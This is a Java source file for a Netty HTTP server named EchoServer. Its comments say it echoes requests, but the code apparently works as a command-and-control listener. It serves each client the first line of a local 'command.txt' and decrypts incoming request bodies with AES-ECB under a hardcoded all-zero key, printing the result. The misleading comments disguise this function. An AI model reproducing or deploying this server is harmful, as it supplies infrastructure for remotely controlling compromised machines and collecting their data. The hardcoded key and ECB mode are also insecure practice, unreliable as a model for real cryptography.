package org.example;

import io.netty.bootstrap.ServerBootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioServerSocketChannel;
import io.netty.handler.codec.http.*;
import io.netty.handler.logging.LogLevel;
import io.netty.handler.logging.LoggingHandler;
import io.netty.util.CharsetUtil;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.List;

public class EchoServer {
    static String encryptionKey = "0000000000000000"; // 128-bit key
    public static String decrypt(String input, String key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), "AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        byte[] decodedBytes = Base64.getDecoder().decode(input);
        byte[] decryptedBytes = cipher.doFinal(decodedBytes);
        return new String(decryptedBytes);
    }

    public static void main(String[] args) throws Exception {
        EventLoopGroup bossGroup = new NioEventLoopGroup(1);
        EventLoopGroup workerGroup = new NioEventLoopGroup();

        try {
            ServerBootstrap serverBootstrap = new ServerBootstrap();
            serverBootstrap.group(bossGroup, workerGroup)
                    .channel(NioServerSocketChannel.class)
                    .handler(new LoggingHandler(LogLevel.DEBUG))
                    .childHandler(new ChannelInitializer<SocketChannel>() {
                        @Override
                        protected void initChannel(SocketChannel ch) {
                            ChannelPipeline pipeline = ch.pipeline();

                            // Add an HTTP server codec to handle HTTP requests and responses.
                            pipeline.addLast(new HttpServerCodec());

                            // Add an HTTP object aggregator to handle the HTTP message as a single FullHttpRequest.
                            pipeline.addLast(new HttpObjectAggregator(65536));

                            // Add a custom HTTP handler that echoes back the received HTTP request.
                            pipeline.addLast(new HttpEchoServerHandler());
                        }
                    });

            ChannelFuture future = serverBootstrap.bind(1234).sync();
            future.channel().closeFuture().sync();
        } finally {
            bossGroup.shutdownGracefully();
            workerGroup.shutdownGracefully();
        }
    }


    private static class HttpEchoServerHandler extends SimpleChannelInboundHandler<FullHttpRequest> {
        String filePath = "command.txt";
        static String content;
        static  ByteBuf buffer;
        @Override
        protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) {

            try {
                Path path = Paths.get(filePath);
                List<String> lines = Files.readAllLines(path, StandardCharsets.UTF_8);

                if (!lines.isEmpty()) {
                    String firstLine = lines.get(0);
//                    System.out.println("First line of the file: " + firstLine);
                      buffer = Unpooled.copiedBuffer(firstLine, CharsetUtil.UTF_8);
                } else {
                    System.out.println("command.txt is empty.");
                }
            } catch (IOException e) {
                e.printStackTrace();
            }

            String responseContent = request.content().toString(io.netty.util.CharsetUtil.UTF_8);
            // Echo the received HTTP request back to the client.
            FullHttpResponse response = new DefaultFullHttpResponse(
                    HttpVersion.HTTP_1_1,
                    HttpResponseStatus.OK,
                    buffer
            );
            response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain; charset=UTF-8");
            response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());

            try {
                System.out.println(decrypt(responseContent,encryptionKey));
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            ctx.writeAndFlush(response);
            // Close the channel after the response is sent.
            ctx.close();
        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            cause.printStackTrace();
            ctx.close();
        }
    }
}